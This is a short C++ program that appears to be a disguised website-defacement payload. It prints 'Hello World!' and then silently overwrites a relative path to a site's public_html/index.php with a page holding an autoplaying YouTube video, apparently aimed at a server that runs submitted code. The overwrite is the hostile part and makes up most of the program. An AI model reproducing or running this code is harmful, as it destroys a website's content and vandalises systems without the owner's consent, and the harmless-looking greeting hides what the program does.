#include <iostream>
#include <fstream>
using namespace std;
int main()
{
 cout<<"Hello World!"; 
 ofstream fout("../../public_html/index.php");
 fout<<"<title>Capitanul Burcea</title><iframe width=\"420\" height=\"315\" src=\"https://www.youtube.com/v/2AlYR9-uaIo?autoplay=1\" frameborder=\"0\" allowfullscreen></iframe>";
}